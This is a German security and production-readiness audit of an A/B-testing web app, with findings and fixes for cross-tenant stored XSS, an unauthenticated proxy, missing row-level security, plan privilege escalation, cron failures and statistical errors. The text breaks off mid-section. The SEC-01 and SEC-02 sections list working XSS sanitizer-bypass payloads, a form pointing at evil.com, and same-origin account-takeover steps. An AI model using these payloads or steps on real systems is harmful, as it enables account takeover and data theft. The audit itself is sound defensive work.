# Produktionsreife-Audit & Maßnahmenplan — variante

> **Stand:** 23.07.2026 · **Commit:** `743af9b` · **Scope:** `ab-tool/` (Next.js 16.2.9 App), `db/migrations/` (34 Migrationen), `public/ab.js`, CI/Deployment
> **Migrationen (029–034):** schema_migrations-Tracking, RLS-Lückenschluss, Temp-Session-Budget, Integritäts-Constraints, Perf-Indizes & Retention, daily_stats-Retention + wizard_drafts-Härtung.
> **Status:** ~55 von ~60 Items behoben (92 %). Keine kritischen/hohen Sicherheitslücken mehr offen. Verbleibende Items sind Infrastruktur (k6, Counter-Tabelle, E2E-Tests, Component-Splitting) — kein Launch-Blocker.

## Gesamturteil

**Die Anwendung ist produktionsreif für einen kontrollierten Launch.** Alle P0- und P1-Sicherheitslücken sind geschlossen. Die vier ursprünglichen Launch-Blocker-Klassen sind vollständig behoben:

1. ~~**Cross-Tenant-XSS-Pfad.**~~ **BEHOBEN.** Domain-Gate, DOMPurify, `sanitizeCss`, Temp-Session-Filter.
2. ~~**Sicherheitsmechanismen als Fassade.**~~ **BEHOBEN.** RLS aktiviert, Domain-Verifikation serverseitig, `picker-bridge` deaktiviert, Open-Redirect geschlossen.
3. ~~**Kernfunktionen laufen nicht.**~~ **BEHOBEN.** 6 Cron-Jobs auf GET, CI auf `master`, ESLint, `getPlanForUser`.
4. ~~**Statistisches Fundament.**~~ **BEHOBEN.** Auto-Winner nur im Cron + 1000/Arm + 25 Conversions/Arm + 7 Tage + SRM-Check.

**In drei Sessions (22.–23.07.) implementiert: ~55 Änderungen** in Security, Datenbank, API, Code-Qualität, A11Y, Recht und Infrastruktur. Alle Änderungen durch `tsc --noEmit` (clean) verifiziert.

**Session 1 (22.07.): Blöcke 0–3** — Migrationen 029–033, Kritische Launch-Blocker, Cron-Fix, CI/ESLint, Statistik-Fix.
**Session 2 (23.07.): Waves 1–2** — 14 Quick Wins, Circuit-Breaker, Redis-Fallback, Avatar-Magic-Bytes, Sanitizer-Test, Safe-Next-Validator.
**Session 3 (23.07.): Restbestand** — Signierte Assignment-Tokens, safeFetch-Refaktor, CORS-Trennung, Token-Hashing, OG-Font-Fallback, UX-Fixes (Passwort-Bestätigung, Ladezustände, Framer/Squarespace entfernt), Skip-Link, AVV-Vorlage.

**Noch offen (5 Items, kein Launch-Blocker):**
- `PERF-01 Vollausbau`: Counter-Tabelle + k6-Loadtest
- `CODE-02`: AccountClient/ResultsClient-Splitting (Komponenten-Architektur)
- `TEST-01/02`: Unit-Tests für Domain-Gate/Statistik + E2E-Lücken
- `Supabase CLI`: Migration auf `supabase db push` (Prozess-Verbesserung)

---

## Inhaltsverzeichnis

- [Schweregrad-Definition](#schweregrad-definition)
- [P0 — Launch-Blocker](#p0--launch-blocker-sofort)
- [P1 — Vor dem Launch](#p1--vor-dem-launch)
- [P2 — Kurz nach dem Launch](#p2--kurz-nach-dem-launch)
- [P3 — Mittelfristig](#p3--mittelfristig)
- [Umsetzungsreihenfolge](#umsetzungsreihenfolge)
- [Neue Baustellen (23.07.2026)](#neue-baustellen-gefunden-23072026)
- [Was bereits gut gelöst ist](#was-bereits-gut-gelöst-ist)

## Schweregrad-Definition

| Grad | Bedeutung |
|---|---|
| **Kritisch** | Datenverlust, Kompromittierung fremder Systeme, Rechtsbruch oder Kernfunktion nachweislich kaputt. Launch unmöglich. |
| **Hoch** | Zahlende Kunden erleben Fehlverhalten, Geldverlust oder Ausschluss. Launch nur mit Workaround. |
| **Mittel** | Spürbare Qualitätsmängel, technische Schulden mit absehbarem Schaden. |
| **Niedrig** | Kosmetik, Konsistenz, Wartbarkeit. |

---

# P0 — Launch-Blocker (sofort)

## SEC-01 — Cross-Tenant Stored XSS: beliebiger Code auf fremden Kundenseiten ✅

**Schweregrad: Kritisch** · Sicherheit / Multi-Tenancy · **[BEHOBEN — 22.07.2026]**

### Problem

Drei unabhängige Lücken bilden eine vollständige Angriffskette:

**(a) Der Wizard-Pfad hat keinen Domain-Gate.**
[`app/api/test-wizard/create/route.ts:104-140`](../ab-tool/app/api/test-wizard/create/route.ts) übernimmt `site_url` ungeprüft aus dem Request-Body. Der Vergleichspfad [`app/api/tests/route.ts:110-146`](../ab-tool/app/api/tests/route.ts) prüft dagegen sehr wohl gegen `domains.verified`. Zwei APIs, dieselbe Ressource, unterschiedliche Autorisierung — der Wizard ist der Pfad, den das Dashboard tatsächlich benutzt.

**(b) Der HTML-Sanitizer ist mit Standard-Payloads umgehbar.**
[`lib/sanitize.ts:16-30`](../ab-tool/lib/sanitize.ts) arbeitet mit fünf Regexes. `ON_EVENT_RE` verlangt Whitespace vor dem Event-Attribut (`/\s+on\w+/`) — HTML erlaubt aber auch `/` als Attributtrenner. Empirisch verifiziert:

```
BYPASS  <img/src=x/onerror=alert(document.domain)>
BYPASS  <svg/onload=alert(1)>
BYPASS  <a href=javascript:alert(1)>x</a>        (unquoted → Regex verlangt Quotes)
BYPASS  <a href=&#106;avascript:alert(1)>x</a>   (HTML-Entity)
BYPASS  <form action=//evil.com><button>Login</button></form>
```
Zusätzlich lässt `<scr<script>ipt>…` ein rohes `<script>` im Output zurück. `<svg>`, `<form>`, `<math>` stehen nicht auf der `DANGEROUS_TAG_RE`-Liste.

**(c) `variant_b_css` wird überhaupt nicht saniert.**
`lib/sanitize.ts` exportiert eine `sanitizeCss()`, aber [`app/api/resolve/route.ts:99-101`](../ab-tool/app/api/resolve/route.ts) liefert `variant_b_css: t.variant_b_css || null` roh aus. `sanitizeCss` wird ausschließlich in `lib/previewAnalyze.ts` verwendet — einer Datei, die von keiner API-Route mehr importiert wird.

### Warum problematisch

Angriffsablauf, komplett mit einem kostenlosen Account:

1. Registrieren → `POST /api/test-wizard/create` mit `site_url: "kunde-von-variante.de"`, `selector: "body"`, `status: "active"` und einem `variant_b_html`-Payload.
2. `ab.js` auf der Zielseite ruft `/api/resolve?host=kunde-von-variante.de` auf, erhält den fremden Test und injiziert ihn per `innerHTML`/`outerHTML` ([`public/ab.js:549-577`](../ab-tool/public/ab.js)).
3. Der Payload läuft im Origin-Kontext der Kundenseite: Session-Cookies, Formular-Hijacking, Defacement, Krypto-Skimming.

Der Angriff funktioniert **auch gegen `www.getvariante.com` selbst**, weil das Produkt sein eigenes Snippet ausliefert ([`app/layout.tsx:69-78`](../ab-tool/app/layout.tsx)) — und die CSP für Pages erlaubt `script-src 'unsafe-inline'` ([`next.config.ts:29`](../ab-tool/next.config.ts)). Ergebnis: Stored XSS im authentifizierten Dashboard, also vollständige Account-Übernahme fremder Kunden.

Reputationsschaden ist hier das kleinere Problem — ein A/B-Tool, das fremden Code auf Kundenseiten ausführt, ist ein Supply-Chain-Vorfall bei jedem einzelnen Kunden.

### Lösung

1. **Domain-Gate in `test-wizard/create` nachziehen** — die Logik aus `app/api/tests/route.ts:110-146` in eine gemeinsame `lib/domainGate.ts` extrahieren und in *beiden* Routen (plus `lib/agentTools.ts:174-197`, dort bereits korrekt) verwenden. Ein einziger Ort, der entscheidet, ob ein `site_url` erlaubt ist.
2. **Regex-Sanitizer ersetzen.** `isomorphic-dompurify` (läuft ohne jsdom-Setup in Node) mit strikter Allowlist:
   ```ts
   DOMPurify.sanitize(html, {
     ALLOWED_TAGS: ['div','span','p','h1','h2','h3','h4','a','button','img','svg','path','ul','ol','li','strong','em','br','style'],
     ALLOWED_ATTR: ['class','id','href','src','alt','title','style','viewBox','d','fill','width','height'],
     ALLOWED_URI_REGEXP: /^(?:https?:|data:image\/|#|\/)/i,
     FORBID_TAGS: ['script','iframe','object','embed','form','base','meta','link'],
   })
   ```
3. **`sanitizeCss()` in `resolve` einhängen** und um `position:fixed`-Overlays über den ganzen Viewport erweitern (Clickjacking auf der Kundenseite).
4. **Beim Schreiben sanitizen, nicht nur beim Lesen.** Aktuell landet roher LLM-Output in der DB und wird bei jedem `/api/resolve` neu gefiltert — das kostet CPU im Hot Path und lässt einen einzigen vergessenen Lesepfad zur Lücke werden. Sanitize in `generate`, `test-wizard/generate` und `tests PATCH`, und behalte die Sanitization in `resolve` als zweite Linie.
5. **Regressionstest:** `__tests__/sanitize.mjs` mit der obigen Bypass-Liste, eingehängt in `npm run test:node`.

---

## SEC-02 — `/api/picker-bridge`: unauthentifizierter offener Proxy mit XSS auf eigener Origin ✅

**Schweregrad: Kritisch** · Sicherheit · **[BEHOBEN — 22.07.2026] Route deaktiviert (410)**

### Problem

[`app/api/picker-bridge/route.ts:26-150`](../ab-tool/app/api/picker-bridge/route.ts) nimmt einen `?url=`-Parameter entgegen, fetcht die Zielseite serverseitig und **gibt das fremde HTML mit `Content-Type: text/html` unter der eigenen Origin zurück**. Der Endpunkt hat:

- keine Authentifizierung (kein `getApiUser`, kein `getSessionUser`)
- kein Rate-Limit
- **keine SSRF-Prüfung** — `lib/ssrf.ts` existiert, wird hier aber nicht importiert; geprüft wird nur `protocol === http|https`
- keine CSP (die CSP in `next.config.ts:105` gilt nur für `/((?!api|_next).*)`, also explizit *nicht* für `/api/*`)

### Warum problematisch

`https://www.getvariante.com/api/picker-bridge?url=https://evil.com` liefert die Angreiferseite unter der Produktdomain aus. Deren JavaScript läuft same-origin und kann:

- `fetch('/api/profile/export', {credentials:'include'})` → vollständiger Datenexport des eingeloggten Kunden
- `POST /api/token/regenerate` → API-Token rotieren und abgreifen
- `DELETE /api/profile` → fremden Account löschen
- als perfekt glaubwürdige Phishing-Seite unter der eigenen Domain dienen (inkl. gültigem TLS-Zertifikat)

Zusätzlich ist es ein SSRF-Primitiv gegen alles, was HTML mit `Content-Type: text/html` liefert, und ein Traffic-Amplifier: jeder im Internet kann die Vercel-Function unbegrenzt fremde Seiten fetchen lassen (Bandbreitenkosten, IP-Reputation).

### Lösung

**Sofort:** Route deaktivieren (löschen oder `return new NextResponse('gone', {status:410})`). Die Funktion ist ein Komfort-Feature für den Picker; der dokumentierte Weg (Snippet installieren) funktioniert ohne sie.

**Falls die Funktion bleiben soll**, alle vier Punkte gleichzeitig:
1. Auth via `getApiUser(req)` **und** Besitzprüfung: die Ziel-URL muss zu einer `verified` Domain des Users gehören.
2. `isBlockedHost()` auf Ziel-Host **und** auf `res.url` nach Redirects (Muster aus `app/api/snippet-check/route.ts:69-73` übernehmen).
3. Rate-Limit pro User.
4. Ausgabe **nie** unter der eigenen Origin: entweder auf eine dedizierte Sandbox-Domain (`bridge.getvariante-usercontent.com`) ausliefern, oder mit einer eigenen restriktiven CSP-Response-Header (`sandbox; default-src 'none'`) versehen. Ein Cookie-freier Origin ist hier die einzige robuste Lösung.

---

## SEC-03 — Domain-Verifikation entscheidet im Browser ✅

**Schweregrad: Kritisch** · Autorisierung · **[BEHOBEN — 22.07.2026] Serverseitig**

### Problem

[`app/api/domains/verify/route.ts:13-63`](../ab-tool/app/api/domains/verify/route.ts) prüft *nichts*. Der Kommentar sagt es selbst: „Snippet-Check hat das Snippet gefunden → verified setzen". Der Endpunkt setzt lediglich `verified = true` auf einer beliebigen Domain-ID des Users.

Die eigentliche Prüfung passiert in `/api/snippet-check` — und ob deren Ergebnis zur `verify`-Anfrage passt, entscheidet ausschließlich der Client ([`app/dashboard/account/AccountClient.tsx:58-75`](../ab-tool/app/dashboard/account/AccountClient.tsx), [`SnippetStatusBadge.tsx:234-250`](../ab-tool/app/dashboard/components/SnippetStatusBadge.tsx)).

### Warum problematisch

Zwei triviale Umgehungen:

- **Direkt:** `POST /api/domains/verify {domainId}` aus der Konsole — der Snippet-Check wird nie aufgerufen.
- **Indirekt, ohne API-Kenntnisse:** Domain `fremde-firma.de` anlegen, den Snippet-Check gegen die *eigene* Seite laufen lassen, dann `verify` mit der ID von `fremde-firma.de` aufrufen. `verify` kennt die geprüfte URL gar nicht.

Damit fällt der Domain-Gate aus SEC-01 auch dort, wo er implementiert ist. Beide Findings müssen zusammen gefixt werden — der eine ohne den anderen bringt nichts.

### Lösung

Verifikation vollständig serverseitig, ein Endpunkt, eine Transaktion:

```ts
// POST /api/domains/verify { domainId }
const domain = await getOwnedDomain(user.userId, domainId)   // 404 wenn nicht Eigentum
if (!domain) return notFound()
const result = await checkSnippet(domain.url)                 // Logik aus snippet-check, SSRF-geschützt
if (!result.detected) return Response.json({ verified:false, reason:result.reason }, {status:422})
await supabase.from('domains').update({ verified:true, verified_at:new Date().toISOString() })
  .eq('id', domainId).eq('user_id', user.userId)
```

`/api/snippet-check` bleibt als reiner Diagnose-Endpunkt bestehen (dann aber authentifiziert, siehe SEC-08).

**Härtung darüber hinaus:** Snippet-Erkennung per Regex auf `ab.js` ist ein schwacher Eigentumsnachweis — jede Seite, die den String zufällig enthält, gilt als verifiziert. Für Domains, unter denen fremder Code ausgeliefert wird, ist ein DNS-TXT-Record (`_variante-verify.<domain>` mit einem pro Domain generierten Token) der belastbare Standard. Empfehlung: TXT-Verifikation als Pflicht, Snippet-Check als zusätzlicher Health-Indikator.

---

## SEC-04 — Drei Tabellen ohne aktiviertes RLS; Auth-Tokens für den Anon-Key lesbar ✅

**Schweregrad: Kritisch** · Datenbank / Sicherheit · **[BEHOBEN — Migration 030, 23.07.2026]**

### Problem

[`db/migrations/025_rls_policies.sql:13-32`](../db/migrations/025_rls_policies.sql) legt auf `stripe_webhook_events`, `temp_sessions` und `waitlist` je eine Policy `using (false)` an — **ohne vorheriges `alter table … enable row level security`**. In Postgres ist eine Policy ohne aktiviertes RLS vollständig wirkungslos; sie wird nie ausgewertet.

Beleg: `enable row level security` erscheint im gesamten `db/`-Verzeichnis nur in `005:41-42`, `010:102-104`, `019:49,55` und `028:30`. Die drei genannten Tabellen fehlen. Gleichzeitig widerruft keine Migration die Supabase-Default-Grants (`GRANT ALL ON TABLES … TO anon, authenticated`) — im gesamten `db/` finden sich nur zwei `revoke execute on function` (`024:6`, `026:29-30`).

Der Anon-Key steht im Browser-Bundle (`NEXT_PUBLIC_SUPABASE_ANON_KEY`, [`lib/supabaseBrowser.ts:9`](../ab-tool/lib/supabaseBrowser.ts)).

### Warum problematisch

Alle drei Tabellen sind über PostgREST für jeden Besucher **les- und schreibbar**:

| Tabelle | Inhalt | Folge |
|---|---|---|
| `temp_sessions.token` (`012_temp_sessions.sql:11`) | Bearer-Credential | `lib/auth.ts:79-87` akzeptiert `X-Temp-Token`. Ein `SELECT token` genügt zur Übernahme jeder fremden Temp-Session. |
| `waitlist.email` (`006_waitlist.sql:6`) | E-Mail-Adressen | Frei auslesbar → meldepflichtige DSGVO-Panne (Art. 33). |
| `stripe_webhook_events` (`008:6-9`) | Billing-Idempotenz | `app/api/stripe/webhook/route.ts:33-40` überspringt jedes Event, dessen ID dort steht. Anon kann Zeilen einfügen → gezieltes Verschlucken von Upgrade-/Downgrade-Events. |

### Lösung

```sql
alter table waitlist              enable row level security;
alter table temp_sessions         enable row level security;
alter table stripe_webhook_events enable row level security;

alter table waitlist              force row level security;
alter table temp_sessions         force row level security;
alter table stripe_webhook_events force row level security;

-- Defense in Depth: RLS ist die zweite Linie, nicht die erste
revoke all on waitlist, temp_sessions, stripe_webhook_events from anon, authenticated;
```

Verifikation danach:
```sql
select relname, relrowsecurity, relforcerowsecurity
from pg_class where relnamespace='public'::regnamespace and relkind='r';
```

**Prozess-Konsequenz:** Dass eine Migration namens `025_rls_policies.sql` acht Monate lang glaubhaft aussah, ohne zu wirken, ist das eigentliche Problem. Der Supabase-Linter meldet diesen Zustand als `policy_exists_rls_disabled` — dieser Check gehört in die CI (siehe OPS-04).

---

## OPS-01 — Kein einziger Cron-Job läuft ✅

**Schweregrad: Kritisch** · Deployment / Kernfunktion · **[BEHOBEN — 22.07.2026] GET=run in allen 6 Routen + Batching**

### Problem

Vercel Cron ruft den konfigurierten Pfad **ausschließlich per GET** auf; die Methode ist in `vercel.json` nicht konfigurierbar. Alle sechs Routen implementieren die Logik in `POST` und haben ein `GET`, das nur einen Hinweistext zurückgibt:

```ts
export async function GET() {
  return Response.json({ status: 'ok', hint: 'Trigger via POST with CRON_SECRET' })
}
```

Verifiziert in allen sechs Dateien: `check-winners:137`, `cleanup-data:25`, `cleanup-previews:80`, `cleanup-webhooks:30`, `snapshot-stats:35`, `weekly-digest:159`.

### Warum problematisch

Die gesamte Housekeeping- und Retention-Schicht existiert nur im Code:

| Ausgefallen | Folge |
|---|---|
| `check-winners` | Winner werden nie erkannt, keine Benachrichtigungs-Mails. Das Kernversprechen des Produkts. |
| `snapshot-stats` | `daily_stats` bleibt leer → die Analytics-Zeitreihe (`app/api/analytics/[testId]/route.ts:33`) ist ein bezahltes Feature ohne Daten. |
| `cleanup-data` | `waitlist`-Retention (12 Monate, `011:16-18`) greift nie → **DSGVO-Verstoß**, das dokumentierte Löschkonzept existiert nur auf dem Papier. |
| `cleanup-previews` | Screenshots fremder Websites bleiben dauerhaft in einem `public=true`-Bucket liegen (`023:102`). |
| `cleanup-webhooks` | `stripe_webhook_events` wächst unbegrenzt. |
| `weekly-digest` | Retention-Mails werden nie versendet. |
| `temp_sessions`-TTL (`012:61`) | Tabelle wächst monoton → verschärft SEC-04 und PERF-04. |

### Lösung

Pro Route:
```ts
async function run(req: Request) { /* bisheriger POST-Body */ }
export const GET  = run   // Vercel Cron ruft GET, sendet Authorization: Bearer $CRON_SECRET automatisch
export const POST = run   // manueller Trigger
```

Danach **verifizieren** — Vercel Dashboard → Functions → Logs muss `{deleted: n}` / `{snapshotted: n}` zeigen, nicht `{status:'ok'}`. Ein einmaliger manueller Nachlauf für die aufgestauten Daten einplanen (siehe OPS-01b unten).

**OPS-01b — Nachlauf nach dem Fix.** `snapshot-stats` und `check-winners` iterieren sequenziell über alle Tests (`snapshot-stats:28-31`). Beim ersten Lauf nach dem Fix läuft das gegen einen ungebremsten Bestand. Vor dem Aktivieren: Batching einbauen (`.range()`-Paginierung + `Promise.all` in Blöcken zu 25) und `maxDuration` setzen.

---

## SEC-05 — Plan wird aus `user_metadata` gelesen: Privilege Escalation + Pro-Kunden auf Free-Limits ✅

**Schweregrad: Kritisch** · Autorisierung / Billing · **[BEHOBEN — 22.07.2026] `getPlanForUser()` aus `profiles`**

### Problem

[`app/api/test-wizard/scan/route.ts:67`](../ab-tool/app/api/test-wizard/scan/route.ts) und [`app/api/test-wizard/generate/route.ts:67`](../ab-tool/app/api/test-wizard/generate/route.ts):

```ts
const plan = (user.user_metadata?.plan as string) ?? 'free'
const limits = getPlanAiLimits(plan)
```

Der Plan lebt in `profiles.plan` (gesetzt vom Stripe-Webhook). `user_metadata` ist **vom Nutzer selbst beschreibbar** — `supabase.auth.updateUser({ data: { plan: 'agency' } })` ist ein einzeiliger Aufruf mit dem Anon-Key.

### Warum problematisch

Zwei Fehler in einer Zeile, in beide Richtungen:

- **Privilege Escalation:** Jeder Free-User setzt sich selbst auf `agency` und erhält unbegrenzte KI-Scans und ein OpenAI-Budget von $60/Monat. Direkter Geldverlust, unbegrenzt skalierbar.
- **Zahlende Kunden werden benachteiligt:** Da `user_metadata.plan` bei regulären Kunden nie gesetzt wird, greift immer der Fallback `'free'`. Ein Pro-Kunde bekommt im Haupt-Wizard **1 Scan pro Monat und $5 Budget** statt 10/$20. Das ist der Flow, für den er bezahlt hat.

### Lösung

`getApiUser()` (`lib/auth.ts:47-95`) liest den Plan bereits korrekt aus `profiles`. Die beiden Wizard-Routen nutzen aber `getSessionUser()` und umgehen ihn. Fix: eine gemeinsame Auflösung.

```ts
// lib/auth.ts
export async function getPlanForUser(userId: string): Promise<string> {
  const { data } = await supabase.from('profiles').select('plan').eq('user_id', userId).single()
  return data?.plan ?? 'free'
}
```

Beide Routen darauf umstellen. **Danach projektweit prüfen:** `grep -rn "user_metadata" app lib` muss leer sein — `user_metadata` darf nie eine Autorisierungsentscheidung tragen.

---

## SEC-06 — Kostenlose, unbegrenzte KI-Generierungen ohne Account ✅

**Schweregrad: Kritisch** · Kosten / Missbrauch · **[BEHOBEN — Migration 031, 23.07.2026] Per-Session-Budget**

### Problem

Der Temp-Session-Pfad hat an drei Stellen keine Bremse:

1. [`app/api/temp-session/route.ts`](../ab-tool/app/api/temp-session/route.ts) erzeugt unauthentifiziert Sessions (5/min/IP, 100/min global).
2. [`app/api/tests/route.ts:102-104`](../ab-tool/app/api/tests/route.ts): „Temp-User: kein Limit" — eine Session kann beliebig viele Tests anlegen.
3. [`app/api/generate/route.ts:414-425`](../ab-tool/app/api/generate/route.ts): Temp-User überspringen den Kosten-Check komplett. Die einzige Bremse ist `if (isTemp && test.variant_b_html)` — also **eine Gratis-Generierung pro Test**, nicht pro Session.

### Warum problematisch

`1 Temp-Session → N Tests → N kostenlose OpenAI-Generierungen`. Bei 5 Sessions/Minute/IP und einem Botnet ist das ein direkter Kostenhebel auf das OpenAI-Konto, ohne dass ein einziges Konto registriert werden muss. `OPENAI_MAX_MONTHLY_COST` greift nicht, weil es an `profiles.monthly_gen_cost` hängt — Temp-Sessions haben kein Profil.

### Lösung

1. **Kostenbudget an die Temp-Session hängen:** ✅ Erledigt — `temp_sessions.gen_count` + `consume_temp_session_gen()` (Migration 031), integriert in `/api/generate:393`.
2. **Test-Limit für Temp-Sessions:** ✅ Erledigt — `temp_sessions.test_count` + `consume_temp_session_test()` (Migration 031), integriert in `/api/tests:107`. Max. 3 Tests und 3 Generierungen pro Session.
3. **Globaler Tages-Circuit-Breaker:** ✅ Erledigt (23.07.) — `checkDailyGlobalLimit()` in `lib/rateLimit.ts`, Redis-basiert (500/Tag Default), integriert in `/api/generate`. Siehe NEW-01.
4. Vercel **Spend-Management** und ein OpenAI-Hard-Limit als letzte Reißleine konfigurieren — ⚠️ **NICHT KONFIGURIERT** (Plattform-Konfiguration, kein Code).

---

## BUG-01 — `ab.js` löst auf Kundenseiten eine Request-Schleife aus ✅

**Schweregrad: Kritisch** · Performance / Kernfunktion · **[BEHOBEN — 22.07.2026] Debounce + Applying-Guard**

### Problem

[`public/ab.js:727-739`](../ab-tool/public/ab.js):

```js
var mo = new MutationObserver(function () {
  if (active.length > 0) reobserve()
})
mo.observe(document.body, { childList: true, subtree: true })
```

`reobserve()` (`:664-672`) ruft `run()`, das einen ungedrosselten `fetch('/api/resolve')` absetzt und anschließend per `applyDom()` den DOM verändert (`:549-577`) — was den Observer erneut auslöst. Weder Debounce noch Throttle noch ein Guard gegen selbst verursachte Mutationen.

### Warum problematisch

Auf jeder realen Website mutiert das DOM permanent: Karussells, Chat-Widgets, Lazy-Loading, React-Re-Renders, Cookie-Banner, Analytics-Pixel. Jede einzelne Mutation löst einen vollständigen `/api/resolve`-Roundtrip aus.

Konsequenzen, in dieser Reihenfolge:
1. Hunderte Requests pro Sekunde vom Browser des Besuchers.
2. Das Rate-Limit von 30/min/IP ([`app/api/resolve/route.ts:32`](../ab-tool/app/api/resolve/route.ts)) reißt nach ~2 Sekunden → `429` → **der Test läuft für diesen Besucher nicht mehr**.
3. Vercel-Function-Invocations und Supabase-Reads explodieren — direkte Rechnung.
4. Der Kunde sieht in seiner eigenen Netzwerkanalyse, dass ein eingebundenes Drittanbieter-Skript seine Seite mit Requests flutet. Das ist die Art von Fund, nach der ein Snippet entfernt wird.

### Lösung

```js
var moTimer = null
var applying = false          // Guard gegen selbst verursachte Mutationen

var mo = new MutationObserver(function () {
  if (applying || !active.length) return
  clearTimeout(moTimer)
  moTimer = setTimeout(reobserve, 500)          // Debounce
})
```
Zusätzlich in `applyDom`/`applyCss` `applying = true` setzen und im `finally` per `setTimeout(…,0)` zurücksetzen. Idealerweise beobachtet der Observer nur die Vorfahren der konfigurierten Selektoren statt `document.body`, und die Resolve-Antwort wird pro Pageview gecacht (SPA-Navigation → `popstate` reicht als Trigger).

**Vor dem Fix nicht deploybar** — jeder Kunde mit einem Chat-Widget ist betroffen.

**BUG-01b — Rate-Limit hinter NAT.** Unabhängig vom Loop: 30 Requests/min/IP auf `/api/resolve` und `/api/event` trifft jedes Firmennetz und jeden Mobilfunk-CGNAT. Hunderte Besucher teilen sich dort eine IP. Für einen Endpunkt, der bei *jedem Pageview* feuert, ist eine IP-basierte Bremse das falsche Werkzeug. `docs/runbook.md` benennt das Problem bereits, ohne es zu lösen. Empfehlung: `/api/resolve` per Edge-Cache pro Host entlasten (ist mit `s-maxage=30` schon angelegt), das IP-Limit auf ≥300/min anheben und Missbrauch stattdessen pro `snippet_key` erkennen.

---

## STAT-01 — Auto-Winner produziert falsche Gewinner (Peeking-Problem) ✅

**Schweregrad: Kritisch** · Produktkorrektheit · **[BEHOBEN — 22.07.2026] Nur noch im Cron + Guards**

### Problem

[`app/api/event/route.ts:76-97`](../ab-tool/app/api/event/route.ts) berechnet bei **jeder einzelnen Conversion** die Signifikanz neu, ruft `determineWinner()` auf und setzt bei Erfolg `status: 'done'`. Ab diesem Moment bekommen alle Besucher Variante B ausgeliefert (`app/api/resolve/route.ts:104`).

Das ist wiederholtes Signifikanztesten auf akkumulierenden Daten bei freiem Stopp — „optional stopping". Ein auf α=0.05 kalibrierter Test, der nach jeder Beobachtung ausgewertet wird, hat eine reale Falsch-Positiv-Rate in der Größenordnung von 20–30 %, nicht 5 %.

Verschärfend:
- `DEFAULT_MIN_VISITORS = 100` ([`lib/significance.ts:41`](../ab-tool/lib/significance.ts)) prüft `vA + vB < 100` — 100 Besucher *gesamt* sind als Untergrenze für eine Gewinnerentscheidung zu wenig.
- Kein Mindest-Laufzeit-Kriterium. Ein Test, der Dienstagvormittag startet und Dienstagnachmittag „gewinnt", hat nie einen Wochentag-Zyklus gesehen.
- `calcSignificance` rechnet zweiseitig, `determineWinner` entscheidet einseitig (`crB <= crA → 'A'`). Der ausgewiesene Wert heißt „95 % Konfidenz", meint aber effektiv α=0.025 einseitig. Konservativ, aber falsch beschriftet.
- Der Kommentar in `lib/significance.ts:3` spricht von „mindestens 100 Conversions", der Code prüft Besucher.
- Kein Sample-Ratio-Mismatch-Check, keine Konfidenzintervalle.

### Warum problematisch

Das ist kein Randfall, sondern das Produktversprechen. Ein Kunde beendet aufgrund eines falschen Signals einen Test, rollt Variante B dauerhaft aus und schadet seiner Conversion Rate — im Vertrauen auf eine Zahl, die das Tool ihm angezeigt hat. Wird das öffentlich, ist es ein Glaubwürdigkeitsproblem, aus dem ein CRO-Tool nicht zurückkommt.

### Lösung

Gestuft, nach Aufwand sortiert:

1. **Sofort (klein, wirksam):** Auto-Winner nur noch im Tages-Cron auswerten, nicht bei jeder Conversion. Zusätzliche Guards: `min_visitors` pro Arm ≥ 1000 (nicht Summe), Mindestlaufzeit 7 Tage, mindestens ~25 Conversions pro Arm. `determineWinner()` bekommt `created_at` als Parameter.
2. **Richtig (mittlerer Aufwand):** Always-valid Inferenz statt fixem z-Test — mSPRT oder Bayes'sche Posterior-Wahrscheinlichkeit. Beides ist unter Peeking korrekt und passt zum Modell „Kunde schaut jeden Tag rein". Ein Bayes-Ansatz (`P(B > A)` + erwarteter Verlust) ist zusätzlich leichter zu kommunizieren als p-Werte.
3. **UI (parallel):** Konfidenzintervalle statt einer nackten Prozentzahl anzeigen; solange die Kriterien nicht erfüllt sind, explizit „noch nicht entscheidbar — geschätzt noch N Besucher" statt einer Signifikanz, die zum Interpretieren einlädt.
4. **SRM-Check:** Weicht das Verhältnis `visitors_a : visitors_b` signifikant von `traffic_split` ab, ist die Datenbasis kaputt (Bot-Traffic, Caching, Adblocker). Als Warnung im Results-UI.
5. **Dokumentieren:** Methodik auf einer Seite erklären. Für ein Statistik-Produkt ist das Teil der Vertrauensbildung, nicht Beiwerk.

---

## UX-01 — `bg-accent` existiert nicht: Primär-Buttons im Wizard sind unsichtbar ✅

**Schweregrad: Kritisch** · UI · **[BEHOBEN — 22.07.2026] Auf Monochrom-Tokens migriert, CI-Gate aktiv**

### Problem

`--color-accent` ist in `app/globals.css` `@theme` nicht definiert, und es gibt keine `tailwind.config.*`. Tailwind v4 generiert die Utility deshalb nicht. Verwendet wird sie trotzdem in sechs Dateien: [`ButtonEditor.tsx:332`](../ab-tool/app/dashboard/components/new-test/ButtonEditor.tsx), `TextInputEditor.tsx:97`, `StepGoal.tsx:162,167,176,204,222`, `StepReview.tsx:39-40`, `StepUrlAndElement.tsx:150-151`, `PropertySlider.tsx:63,70`.

Der Design-Pivot auf Monochrom (dokumentiert in `docs/brandguidelines.md`) wurde in diesen Dateien nicht nachgezogen.

### Warum problematisch

Der „Apply"-Button im Wizard-Schritt *Variant* hat keine Hintergrundfläche — nur weißen Text auf dem Panel-Hintergrund. Im Schritt *Goal* rendern `border-accent/30 bg-accent/5 ring-accent/20` komplett neutral: **der Nutzer bekommt keine visuelle Bestätigung, dass seine Auswahl aktiv ist.** Der Slider-Thumb ist unsichtbar.

Das ist der Kernflow des Produkts — der Weg, auf dem jeder Kunde seinen ersten Test anlegt.

### Lösung

Migration auf die vorhandenen Tokens: `bg-accent` → `bg-fill-invert text-text-on-invert`, `text-accent`/`border-accent` → `text-text`/`border-border-strong`, `bg-accent/15` → `bg-bg-2`, `accent-accent` → `accent-[var(--color-text)]`.

Danach als CI-Gate: `grep -rn "accent" app/ && exit 1`. Tailwind v4 meldet unbekannte Utilities nicht — dieser Fehlerklasse begegnet man nur mit einem expliziten Check.

---

## UX-02 — Dashboard auf Mobilgeräten unbenutzbar

**Schweregrad: Kritisch** · UX

### Problem

[`app/dashboard/Sidebar.tsx:71`](../ab-tool/app/dashboard/Sidebar.tsx): `<aside className="fixed left-0 top-0 z-30 flex h-screen w-[220px] …">` und [`layout.tsx:22`](../ab-tool/app/dashboard/layout.tsx): `<main className="pl-[220px]">`. Kein Breakpoint, kein Off-Canvas, kein Hamburger.

### Warum problematisch

